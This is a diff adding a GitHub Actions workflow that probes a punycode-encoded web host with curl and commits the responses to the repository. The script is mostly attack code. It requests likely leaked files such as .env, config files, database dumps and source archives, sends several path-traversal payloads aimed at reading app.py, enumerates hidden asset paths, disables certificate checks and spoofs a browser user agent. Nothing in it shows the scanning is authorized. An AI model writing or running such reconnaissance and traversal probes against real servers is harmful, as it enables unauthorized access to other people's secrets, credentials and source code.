@@ -1,0 +1,64 @@
+name: cdn-dump7
+on:
+  push:
+    paths:
+      - '.github/workflows/cdn7.yml'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fetch
+        run: |
+          BASE="https://c60f0a03899a4ea4.xn--80aqf1ad.xn--r1aee.xn--80afol2bmm.xn--p1acf"
+          UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
+          mkdir -p cdn_dump/probe7
+          : > cdn_dump/log7.txt
+          probe() {
+            code=$(curl -k -sS -L --max-time 15 -A "$UA" -H "Accept: */*" \
+              -o "cdn_dump/probe7/$1.bin" -D "cdn_dump/probe7/$1.hdr" \
+              -w '%{http_code} %{size_download} %{content_type}' "$BASE$2" 2>/dev/null || true)
+            echo "$1 $code $2" >> cdn_dump/log7.txt
+          }
+          # server source / config leftovers
+          for p in app.py main.py server.py index.py wsgi.py manage.py \
+                   app.js server.js index.js main.go main.rs src/main.go \
+                   nginx.conf Dockerfile docker-compose.yml .env config.json \
+                   config.yaml settings.py package.json requirements.txt \
+                   backup.zip www.zip src.zip site.zip dump.sql db.sqlite3 \
+                   app.zip dist.zip build.zip; do
+            n=$(echo "$p" | tr '/.' '__')
+            probe "src_$n" "/$p"
+          done
+          # traversal attempts
+          probe trav1 "/originals/../app.py"
+          probe trav2 "/image/../../app.py"
+          probe trav3 "/originals/%2e%2e%2fapp.py"
+          probe trav4 "/static/../app.py"
+          probe trav5 "/metadata/..%2f..%2fapp.py"
+          # extra assets
+          for p in originals/rail originals/logo originals/brand originals/watermark \
+                   originals/press-04-rail originals/press-04.png.bak \
+                   rail/4 rail/2026.06 rails/4 watermark watermark/press-04 \
+                   decode stego profile/rail v18 real-assets 2026-06 \
+                   asset/press-04 assets/rail/press-04 image/press-04/rail; do
+            n=$(echo "$p" | tr '/.' '__')
+            probe "p_$n" "/$p"
+          done
+          # originals for all ids
+          for i in 01 02 03 05 06 07 08 09 10 11 12 13 14 15 16 18 19 20 21 22 24 25; do
+            probe "orig_$i" "/originals/press-$i"
+          done
+          # OPTIONS request
+          curl -k -sS -X OPTIONS -D cdn_dump/probe7/options.hdr -o /dev/null --max-time 15 "$BASE/originals/press-04" || true
+          cat cdn_dump/log7.txt
+      - name: commit
+        run: |
+          git config user.name "cdn-bot"
+          git config user.email "cdn-bot@users.noreply.github.com"
+          git add -A cdn_dump
+          git commit -m "cdn dump7" || echo nothing
+          git push
